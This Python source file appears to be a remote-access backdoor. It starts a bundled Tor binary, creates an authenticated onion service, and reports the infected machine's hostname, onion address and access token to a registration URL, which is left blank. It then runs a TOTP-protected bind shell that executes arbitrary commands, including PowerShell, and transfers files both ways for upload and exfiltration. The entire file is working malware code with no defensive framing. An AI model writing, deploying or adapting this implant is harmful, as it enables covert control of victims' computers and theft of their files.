import os
import gc
import sys
import json
import time
import stem
import queue
import shlex
import base64
import socket
import requests
import threading
import subprocess
import socketserver
import stem.control
import stem.process

from pyotp import TOTP
from stem.util import term


auth_provider = TOTP("")
hidden_service_provider = None


class HiddenServiceProvider:

    def __init__(self, port, reporting_address):
        self._bind_port = port
        self._reporting_address = reporting_address
        self._data_dir = getattr(sys, "_MEIPASS", os.getcwd())
        self._tor_exe = os.path.join(self._data_dir, "tor.exe")
        self._tor_process_handle = None
        self._stem_controller = None

    @staticmethod
    def _init_msg_handler(line):
        print(term.format(line, term.Color.BLUE))

    def _register_service(self, hidden_service_address, authentication_token):
        hostname = socket.gethostname()
        response = requests.post(self._reporting_address, data={
            "hostname": hostname,
            "auth_token": authentication_token,
            "hs_addr": hidden_service_address
        })
        print(f"[+] Hidden service registration status: {response.status_code}")
        print(f"[+] Hidden service registration response: {response.text}")

    def create_service(self):
        if os.path.isfile(self._tor_exe):
            self._tor_process_handle = stem.process.launch_tor_with_config(
                config= {
                  "ControlPort": "9051",
                  "FascistFirewall": "1"
                },
                tor_cmd=self._tor_exe,
                init_msg_handler=self._init_msg_handler
            )
            print("[+] Authenticating with controller . . .")
            self._stem_controller = stem.control.Controller.from_port(port=9051)
            self._stem_controller.authenticate()
            print("[+] Creating hidden service . . .")
            response = self._stem_controller.create_ephemeral_hidden_service(
                {80: 42309},
                await_publication=True,
                basic_auth={"remote_client": None}
            )
            print(f"[+] Service registered at address: {response.service_id}")
            print(f"[+] Auth token required: {response.client_auth['remote_client']}")
            print("[+] Attempting to register hidden service.")
            self._register_service(response.service_id, response.client_auth["remote_client"])
        else:
            print("[!] Unable to launch anonymizer, TOR exe not found.")

    def dispose_service(self):
        print("[+] Disposing hidden service.")
        if self._tor_process_handle is not None:
            self._tor_process_handle.kill()


class ProcessExecWrapper:

    def __init__(self, process_handle, timeout=30):
        self._exit_code = None
        self._timeout = timeout
        self._reset_time = timeout
        self._output_queue = queue.Queue()
        self._process_handle = process_handle
        self._watchdog_handle = None
        self._readline_handle = None
        self.process_running = False

    def _process_watchdog(self):
        print("[+] Process watchdog is running.")
        while self._timeout > 0 and self._exit_code is None:
            time.sleep(1)
            self._timeout -= 1
        if self._timeout <= 0:
            if self._process_handle is not None:
                self._process_handle.kill()
                self._exit_code = -1
                self._output_queue.put(b"Rogue process killed.\r\n")
        self.process_running = False
        print("[+] Process watchdog has ended.")

    def _readline_thread(self):
        print("[+] Readline thread is running.")
        while self.process_running:
            if self._process_handle is not None:
                output = self._process_handle.stdout.readline()
                if output and self._output_queue is not None:
                    self._output_queue.put(output)
                    self._timeout = self._reset_time
            else:
                print("[+] Null process handle, terminating readline thread.")
                break
        print("[+] Readline thread has ended.")

    def begin(self):
        print("[+] Beginning process wrapper . . .")
        self._readline_handle = threading.Thread(target=self._readline_thread)
        self._watchdog_handle = threading.Thread(target=self._process_watchdog)
        self._readline_handle.setDaemon(True)
        self._watchdog_handle.setDaemon(True)
        self.process_running = True
        self._watchdog_handle.start()
        self._readline_handle.start()
        print("[+] Process wrapper has begun.")

    def end(self):
        print("[+] Ending process wrapper . . .")
        self._process_handle = None
        self._readline_handle = None
        self._watchdog_handle = None
        self._output_queue = None
        self._timeout = -1
        gc.collect()
        print("[+] Process wrapper ended.")

    def poll(self):
        print("[+] Polling . . . ")
        if self._process_handle is not None and self._exit_code is None:
            self._exit_code = self._process_handle.poll()
        print(f"[+] Current exit code is {self._exit_code}.")
        if self._output_queue is None or self._output_queue.empty():
            print("[+] Empty output queue, returning true exit code.")
            return self._exit_code
        else:
            print("[+] Non-empty output queue, returning None")
            return None

    def readline(self, timeout=1):
        print("[+] Reading from queue . . .")
        if self._output_queue is not None:
            while timeout:
                if not self._output_queue.empty():
                    output = self._output_queue.get()
                    print(f"[+] Read process output: {output}")
                    return output
                time.sleep(0.25)
                timeout -= 0.25
        return b""


class BoundShell(socketserver.StreamRequestHandler):

    def __init__(self, request, client_address, server):
        self._authenticated = False
        super().__init__(request, client_address, server)

    def _execute_command(self, command):
        process_wrapped = False
        if command[:2] == "cd":
            try:
                directory = command[3:].strip()
                os.chdir(directory)
                return os.getcwd() + "\xff\xff"
            except Exception as e:
                return f"Not found: {directory}\xff\xff"
        process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE, shell=True)
        if "powershell" in command.lower():
            process = ProcessExecWrapper(process)
            process_wrapped = True
            process.begin()
        while True:
            if process_wrapped:
                proc_output = process.readline()
            else:
                proc_output, _ = process.communicate()
            if proc_output != b"" or process.poll() is None:
                if proc_output:
                    print(proc_output)
                    self.request.sendall(proc_output)
                    confirmation_message = self.request.recv(2)
                    if not process_wrapped:
                        break
                    if confirmation_message == b"\x01\x01":
                        continue
                    else:
                        print("[!] Invalid confirmation, breaking.")
                        break
            else:
                print("Process exited")
                break
        if process_wrapped:
            process.end()
        time.sleep(1)
        return f"Process exited with code: {process.poll()}\xff\xff"

    def _handle_upload(self, command):
        file_name = command.split()[1]
        if os.path.isfile(file_name):
            os.unlink(file_name)
        self.request.sendall(bytes(f"Receiving file: {file_name}", "utf-8"))
        file_contents = self.rfile.readline().strip()
        with open(file_name, "wb") as outfile:
            outfile.write(base64.b64decode(file_contents))
        return "File has been uploaded."

    def _handle_download(self, command):
        requested_file = command.split()[1]
        print(requested_file)
        if os.path.isfile(requested_file):
            with open(requested_file, "rb") as infile:
                file_contents = base64.b64encode(infile.read())
            return str(file_contents, "utf-8") + "\n"
        else:
            return f"File not found: {requested_file}"

    def handle(self):
        tear_down = False
        while True:
            print("Awaiting command.")
            command = str(self.rfile.readline().strip(), "utf-8")
            if not command:
                print("[+] Null command, client probably disconnected.  Exiting.")
                break
            command_prefix = command.split()[0]
            print(command)
            if self._authenticated:
                if command_prefix == "fup":
                    response = self._handle_upload(command)
                elif command_prefix == "fdown":
                    response = self._handle_download(command)
                elif command.lower() == "meipass":
                    response = getattr(sys, "_MEIPASS", "Not packaged.")
                    response += "\r\n\xff\xff"
                elif command.lower() == "exit":
                    return
                elif command.lower() == "teardown":
                    tear_down = True
                    response = "Terminating bound shell and hidden service."
                else:
                    response = self._execute_command(command)
            else:
                response = "Access Denied."
                current_code = auth_provider.now()
                if current_code == command:
                    self._authenticated = True
                    response = "Access Granted."
            message = {
                "cwd": os.getcwd() if self._authenticated else None,
                "response": response
            }
            self.request.sendall(bytes(json.dumps(message) + "\n", "utf-8"))
            if tear_down:
                hidden_service_provider.dispose_service()
                sys.exit(0)
            if not self._authenticated:
                return


if __name__ == "__main__":
    bind_port = 42309
    bind_addr = "0.0.0.0"
    registration_addr = ""
    try:
        hidden_service_provider = HiddenServiceProvider(bind_port, registration_addr)
        hidden_service_provider.create_service()
        with socketserver.TCPServer((bind_addr, bind_port), BoundShell) as bound_shell:
            bound_shell.serve_forever()
    finally:
        hidden_service_provider.dispose_service()
